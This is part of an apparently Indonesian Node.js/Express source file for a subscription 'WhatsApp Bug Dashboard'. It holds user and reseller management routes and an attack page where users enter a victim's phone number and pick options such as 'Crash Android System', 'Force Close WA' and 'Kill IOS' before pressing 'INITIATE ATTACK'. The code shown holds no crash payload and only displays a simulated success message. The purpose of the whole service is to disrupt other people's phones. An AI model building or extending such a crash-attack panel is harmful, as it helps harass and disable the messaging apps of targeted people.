                    <label><i class="fas fa-fingerprint"></i> New Identity</label>
                    <input type="text" name="username" value="${targetUser.username}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-terminal"></i> Access Code</label>
                    <input type="text" name="password" value="${targetUser.key}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-hourglass-half"></i> Extend Lifespan (Days)</label>
                    <input type="number" name="extend" min="0" max="365" placeholder="0" value="0">
                </div>

                <div class="form-group">
                    <label><i class="fas fa-shield-halved"></i> Security Protocol</label>
                    <select name="role" ${role === 'reseller' ? 'disabled' : ''}>
                        ${roleOptions}
                    </select>
                    ${role === 'reseller' ? '<input type="hidden" name="role" value="' + targetUser.role + '">' : ''}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-save">
                        <i class="fas fa-save"></i> Commit Changes
                    </button>

                    <button type="button" class="btn btn-delete" onclick="handleDelete()">
                        <i class="fas fa-trash-can"></i> Purge User
                    </button>

                    <a href="/userlist" class="btn btn-back">
                        <i class="fas fa-arrow-left"></i> Abort & Return
                    </a>
                </div>
            </form>
        </div>
    </div>

    <form id="deleteForm" method="POST" action="/hapususer" style="display: none;">
        <input type="hidden" name="username" value="${targetUser.username}">
    </form>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a1a1a',
                lineColor: '#1a1a1a',
                density: 10000,
                proximity: 100
            });
        });

        function handleDelete() {
            if (confirm('Critical Warning: Are you sure you want to purge user ${targetUser.username}? This action is irreversible.')) {
                document.getElementById('deleteForm').submit();
            }
        }
    </script>
</body>
</html>
  `;
  res.send(html);
});

// user profile new


// Tambahkan ini setelah route GET /edituser
app.post("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { oldusername, username: newUsername, password, role, extend } = req.body;

  // Validasi input
  if (!oldusername || !newUsername || !password || !role) {
    return res.send("❌ Semua field harus diisi.");
  }

  // Cari user yang akan diedit
  const targetUserIndex = users.findIndex(u => u.username === oldusername);
  if (targetUserIndex === -1) {
    return res.send("❌ User tidak ditemukan.");
  }

  const targetUser = users[targetUserIndex];

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // Update data user
  users[targetUserIndex] = {
    ...users[targetUserIndex],
    username: newUsername,
    key: password,
    role: role
  };

  // Tambah masa aktif jika ada
  if (extend && parseInt(extend) > 0) {
    users[targetUserIndex].expired += parseInt(extend) * 86400000;
  }

  saveUsers(users);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + newUsername + " berhasil diupdate");
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  // Bug types data - Simplified titles
  const bugTypes = [
    {
      id: 'delay',
      icon: '<i class="fas fa-hourglass-half"></i>',
      title: '50% Delay'
    },
    {
      id: 'medium',
      icon: '<i class="fas fa-tachometer-alt"></i>',
      title: '100% Delay'
    },
    {
      id: 'blank-ios',
      icon: '<i class="fab fa-apple"></i>',
      title: 'iPhone Hard'
    },
    {
      id: 'blank',
      icon: '<i class="fab fa-android"></i>',
      title: 'Blank Android'
    },
    {
      id: 'fcinvsios',
      icon: '<i class="fas fa-eye-slash"></i>',
      title: 'Invisible iOS'
    },
    {
      id: 'force-close',
      icon: '<i class="fas fa-power-off"></i>',
      title: 'Force Close'
    }
  ];

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Bug Dashboard - Execution</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-dark: #07030a;
            --card-bg: #1a1121;
            --accent-pink: #d946ef;
            --accent-purple: #8b5cf6;
            --text-main: #ffffff;
            --text-dim: #a1a1aa;
            --gradient-pink: linear-gradient(90deg, #ec4899, #8b5cf6);
            --danger-yellow: #f59e0b;
            --success-green: #10b981;
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--bg-dark);
            color: var(--text-main);
            padding: 20px;
            padding-bottom: 80px;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 450px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        /* Profile Header */
        .profile-card {
            background: var(--card-bg);
            border-radius: 20px;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .profile-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .avatar {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            border: 2px solid var(--accent-pink);
            object-fit: cover;
        }

        .user-meta h2 {
            font-size: 1.1rem;
            letter-spacing: 1px;
        }

        .role-badge {
            font-size: 9px;
            background: rgba(236, 72, 153, 0.2);
            color: #f472b6;
            padding: 1px 6px;
            border-radius: 4px;
            text-transform: uppercase;
            font-weight: bold;
        }

        .expiry-box {
            text-align: right;
            font-size: 9px;
            color: #fbbf24;
            background: rgba(0,0,0,0.3);
            padding: 4px 8px;
            border-radius: 6px;
        }

        /* Video MP4 Banner */
        .banner-card {
            width: 100%;
            height: 170px;
            border-radius: 20px;
            overflow: hidden;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: #000;
        }

        .banner-card video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Sound Toggle Button */
        .sound-toggle {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 32px;
            height: 32px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--accent-pink);
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 10;
            transition: 0.3s;
        }

        .banner-overlay {
            position: absolute;
            bottom: 0;
            width: 100%;
            padding: 15px;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
            pointer-events: none; /* Supaya tidak menghalangi klik sound toggle */
        }

        .banner-text {
            font-family: 'Orbitron', sans-serif;
            font-size: 13px;
            font-weight: bold;
            color: white;
        }

        /* Input Labels */
        .section-label {
            background: var(--gradient-pink);
            padding: 8px 15px;
            border-radius: 12px 12px 0 0;
            font-family: 'Orbitron', sans-serif;
            font-size: 13px;
            font-weight: bold;
        }

        .input-wrapper {
            background: var(--card-bg);
            border-radius: 0 0 15px 15px;
            padding: 18px;
            display: flex;
            align-items: center;
            gap: 15px;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .input-field {
            background: transparent;
            border: none;
            color: white;
            font-size: 15px;
            outline: none;
            width: 100%;
        }

        /* Custom Dropdown with Scroll */
        .dropdown-container {
            position: relative;
        }

        .select-box {
            background: #25182e;
            padding: 18px;
            border-radius: 0 0 15px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: 0.3s;
        }

        .bug-dropdown-list {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: #1a1121;
            margin-top: 5px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            z-index: 999;
            display: none;
            max-height: 200px;
            overflow-y: auto;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }

        .bug-dropdown-list.active {
            display: block;
        }

        .bug-dropdown-list::-webkit-scrollbar {
            width: 6px;
        }
        .bug-dropdown-list::-webkit-scrollbar-thumb {
            background: var(--accent-pink);
            border-radius: 10px;
        }

        .bug-item {
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            transition: 0.2s;
        }

        .bug-item:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        /* Execute Button */
        .execute-btn {
            background: var(--gradient-pink);
            border: none;
            padding: 16px;
            border-radius: 12px;
            color: white;
            font-family: 'Orbitron', sans-serif;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(236, 72, 153, 0.3);
        }

        .execute-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Modal / Popup Styling */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(5px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            padding: 20px;
        }

        .modal-content {
            background: var(--card-bg);
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            border: 1px solid var(--accent-pink);
            overflow: hidden;
            animation: popupAnim 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes popupAnim {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-header {
            background: var(--gradient-pink);
            padding: 15px;
            text-align: center;
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            font-size: 16px;
            color: white;
        }

        .modal-body {
            padding: 20px;
            text-align: center;
            color: var(--text-dim);
            line-height: 1.6;
        }

        .modal-footer {
            padding: 15px;
            display: flex;
            justify-content: center;
        }

        .close-modal-btn {
            background: transparent;
            border: 1px solid var(--accent-pink);
            color: var(--accent-pink);
            padding: 8px 25px;
            border-radius: 10px;
            cursor: pointer;
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
        }

        /* Modal Variants */
        .modal-content.error { border-color: var(--danger-yellow); }
        .modal-content.error .modal-header { background: var(--danger-yellow); }
        .modal-content.success { border-color: var(--success-green); }
        .modal-content.success .modal-header { background: var(--success-green); }

        /* Bottom Nav */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            width: 100%;
            max-width: 450px;
            background: #000;
            display: flex;
            justify-content: space-around;
            padding: 12px;
            border-top: 1px solid #222;
        }

        .nav-item {
            text-align: center;
            font-size: 10px;
            color: #666;
            text-decoration: none;
            flex: 1;
        }

        .nav-item.active { color: var(--accent-pink); }
        .nav-item i { display: block; font-size: 1.2rem; margin-bottom: 4px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="profile-card">
            <div class="profile-info">
                <img src="https://e.top4top.io/p_364583zcu1.jpg" class="avatar" alt="Avatar">
                <div class="user-meta">
                    <h2>${username}</h2>
                    <span class="role-badge">ROLE VIP</span>
                </div>
            </div>
            <div class="expiry-box">EXPIRES<br>${expired}</div>
        </div>

        <div class="banner-card">
            <video id="bannerVideo" autoplay muted loop playsinline>
                <source src="https://a.top4top.io/m_3644qg30k1.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            
            <div class="sound-toggle" id="soundBtn">
                <i id="soundIcon" class="fas fa-volume-mute"></i>
            </div>

            <div class="banner-overlay">
                <div class="banner-text">One Tap, One Dead</div>
            </div>
        </div>

        <div>
            <div class="section-label">Number Targets</div>
            <div class="input-wrapper">
                <i class="fas fa-mobile-alt" style="color:var(--accent-pink)"></i>
                <input type="text" id="numberInput" class="input-field" placeholder="Masukkan nomor (Contoh: 628xxx)">
            </div>
        </div>

        <div class="dropdown-container">
            <div class="section-label">Pilih Bug</div>
            <div class="select-box" id="menuToggle">
                <div style="display:flex; align-items:center; gap:10px">
                    <i class="fas fa-biohazard" style="color:var(--accent-pink)"></i>
                    <span id="selectedBugLabel">Select Type</span>
                </div>
                <i class="fas fa-caret-down"></i>
            </div>
            <div class="bug-dropdown-list" id="bugDropdown">
            </div>
        </div>

        <button id="executeBtn" class="execute-btn">
            <i class="fas fa-radiation"></i> INITIATE ATTACK
        </button>
    </div>

    <div class="modal-overlay" id="customModal">
        <div class="modal-content" id="modalContent">
            <div class="modal-header" id="modalTitle">NOTIFIKASI</div>
            <div class="modal-body" id="modalMessage">Pesan disini...</div>
            <div class="modal-footer">
                <button class="close-modal-btn" onclick="closeModal()">UNDERSTOOD</button>
            </div>
        </div>
    </div>

    <div class="bottom-nav">
        <a href="/dashboard" class="nav-item"><i class="fas fa-home"></i>Home</a>
        <a href="/execution" class="nav-item active"><i class="fab fa-whatsapp"></i>WhatsApp</a>
        <a href="/tools" class="nav-item"><i class="fas fa-tools"></i>Tools</a>
    </div>

    <script>
        // Data Bug
        const bugTypes = [
            { id: 'crash', icon: 'fab fa-android', title: 'Crash Android System' },
            { id: 'delay', icon: 'fas fa-hourglass-half', title: 'Invisible Delay' },
            { id: 'fcwa', icon: 'fas fa-skull', title: 'Force Close WA' },
            { id: 'ios', icon: 'fab fa-apple', title: 'Kill IOS' },
            { id: 'spam', icon: 'fas fa-envelope-open-text', title: 'Spam Ghost' },
            { id: 'button', icon: 'fas fa-toggle-on', title: 'Button Virus' },
            { id: 'location', icon: 'fas fa-map-marker-alt', title: 'Live Loc Lag' }
        ];

        let selectedBugType = null;
        const bugDropdown = document.getElementById('bugDropdown');
        const menuToggle = document.getElementById('menuToggle');
        const selectedBugLabel = document.getElementById('selectedBugLabel');

        // Logic Sound Toggle
        const bannerVideo = document.getElementById('bannerVideo');
        const soundBtn = document.getElementById('soundBtn');
        const soundIcon = document.getElementById('soundIcon');

        soundBtn.onclick = () => {
            if (bannerVideo.muted) {
                bannerVideo.muted = false;
                soundIcon.classList.remove('fa-volume-mute');
                soundIcon.classList.add('fa-volume-up');
            } else {
                bannerVideo.muted = true;
                soundIcon.classList.remove('fa-volume-up');
                soundIcon.classList.add('fa-volume-mute');
            }
        };

        // Inisialisasi list bug
        function initBugList() {
            bugTypes.forEach(bug => {
                const item = document.createElement('div');
                item.className = 'bug-item';
                item.innerHTML = \`<i class="\${bug.icon}" style="color:var(--accent-pink); width:20px"></i> <span>\${bug.title}</span>\`;
                item.onclick = (e) => {
                    e.stopPropagation();
                    selectedBugType = bug.id;
                    selectedBugLabel.innerText = bug.title;
                    bugDropdown.classList.remove('active');
                };
                bugDropdown.appendChild(item);
            });
        }

        // Toggle dropdown
        menuToggle.onclick = (e) => {
            e.stopPropagation();
            bugDropdown.classList.toggle('active');
        };

        window.onclick = () => { bugDropdown.classList.remove('active'); };

        // Modal Functions
        function showPopup(type, title, message) {
            const modal = document.getElementById('customModal');
            const content = document.getElementById('modalContent');
            content.className = 'modal-content ' + type;
            document.getElementById('modalTitle').innerHTML = title;
            document.getElementById('modalMessage').innerHTML = message;
            modal.style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
        }

        // Execute Attack
        document.getElementById('executeBtn').onclick = function() {
            const num = document.getElementById('numberInput').value;
            
            if (!num) {
                showPopup('error', '<i class="fas fa-exclamation-triangle"></i> ERROR', 'Harap isi <b>Nomor Target</b> sebelum eksekusi!');
                return;
            }

            if (!selectedBugType) {
                showPopup('error', '<i class="fas fa-bug"></i> ERROR', 'Silakan pilih <b>Bug Type</b> terlebih dahulu!');
                return;
            }

            this.disabled = true;
            this.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> EXECUTING...';

            setTimeout(() => {
                showPopup('success', '<i class="fas fa-check-circle"></i> SUCCESS', \`Attack <b>\${selectedBugType.toUpperCase()}</b> berhasil dikirim ke <b>\${num}</b>!\`);
                this.disabled = false;
                this.innerHTML = '<i class="fas fa-radiation"></i> INITIATE ATTACK';
            }, 2000);
        };

        document.addEventListener('DOMContentLoaded', () => {
            initBugList();
        });
    </script>
</body>
</html>`;
};